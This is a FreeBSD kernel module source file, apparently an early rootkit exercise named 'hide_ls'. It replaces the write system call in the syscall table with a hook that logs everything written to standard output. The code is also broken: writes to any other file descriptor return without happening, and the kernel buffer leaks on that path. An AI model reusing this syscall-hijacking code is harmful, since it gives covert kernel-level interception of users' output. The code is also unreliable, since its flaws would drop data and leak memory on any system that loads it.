//#include <stdio.h>
//#include <string.h>

#include <sys/types.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/uio.h>
#include <sys/malloc.h>
#include <sys/errno.h>
#include <sys/syslog.h>
#include <sys/libkern.h>

MALLOC_DEFINE(M_FOOBUF, "foobuffers", "Buffers to foo data into the ether");

static int write_hook(struct thread *td, void *args)
{
    struct write_args *wr_args = (struct write_args *) args;

    char *k_buf = NULL;
    int done = 0;
    int error = 0;
    int n = wr_args->nbyte;

    k_buf = malloc( sizeof(char) * (n + 1), M_FOOBUF, M_NOWAIT | M_ZERO );

    if (k_buf == NULL){
        log(LOG_DEBUG, "Failed to allocate memory write_hook().\n");
        return ENOMEM;
    }

    if (wr_args->fd != 1){
        return 0;
    }

    copyinstr(wr_args->buf, k_buf, n, &done);

    log(LOG_DEBUG, "[DEBUG]: %s\n", k_buf);

    error = sys_write(td, args);

    free(k_buf, M_FOOBUF);
    return error;
}

static int load_handler(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd){
        case MOD_LOAD:
            sysent[SYS_write].sy_call = (sy_call_t *) write_hook;
            break;
        case MOD_UNLOAD:
            sysent[SYS_write].sy_call = (sy_call_t *) sys_write;
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }

    return error;
}

static moduledata_t rk_mod = {
    "hide_ls",   // module name
    load_handler,   // load function
    NULL
};

DECLARE_MODULE(hide_ls, rk_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
